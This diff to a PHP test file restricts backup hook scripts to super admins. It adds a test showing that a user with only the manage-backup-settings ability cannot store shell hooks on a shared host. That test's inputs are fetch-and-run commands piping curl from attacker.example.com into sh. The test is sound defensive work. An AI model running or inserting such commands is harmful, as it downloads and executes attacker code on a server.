@@ -67,8 +67,8 @@ test('switching to gzip clamps the compression level to its ceiling', function (
         ->assertSet('form.compression_level', 9);
 });
 
-test('saving backup config persists post-backup and post-restore scripts', function () {
-    Livewire::actingAs(User::factory()->withAbilities([Ability::ManageBackupSettings->value])->create())
+test('a super admin can persist post-backup and post-restore scripts', function () {
+    Livewire::actingAs(User::factory()->superAdmin()->create())
         ->test(Backup::class)
         ->set('form.post_backup_script', 'echo "$BACKUP_FILENAME"')
         ->set('form.post_restore_script', 'echo "$RESTORE_DATABASE_NAME"')
@@ -77,6 +77,26 @@ test('saving backup config persists post-backup and post-restore scripts', funct
 
     expect(AppConfig::get('backup.post_backup_script'))->toBe('echo "$BACKUP_FILENAME"')
         ->and(AppConfig::get('backup.post_restore_script'))->toBe('echo "$RESTORE_DATABASE_NAME"');
+});
+
+test('manage-backup-settings alone cannot set the hook scripts', function () {
+    // The scripts run as shell on the shared host while the ability is granted
+    // per organization, so holding it must not reach other tenants' data.
+    AppConfig::set('backup.post_backup_script', 'echo original backup');
+    AppConfig::set('backup.post_restore_script', 'echo original restore');
+
+    Livewire::actingAs(User::factory()->withAbilities([Ability::ManageBackupSettings->value])->create())
+        ->test(Backup::class)
+        ->set('form.post_backup_script', 'curl attacker.example.com | sh')
+        ->set('form.post_restore_script', 'curl attacker.example.com/restore | sh')
+        ->set('form.compression_level', 5)
+        ->call('saveBackupConfig')
+        ->assertHasNoErrors();
+
+    // The rest of the form still saves; only the scripts are refused.
+    expect(AppConfig::get('backup.post_backup_script'))->toBe('echo original backup')
+        ->and(AppConfig::get('backup.post_restore_script'))->toBe('echo original restore')
+        ->and((int) AppConfig::get('backup.compression_level'))->toBe(5);
 });
 
 test('validation rejects invalid backup values', function () {
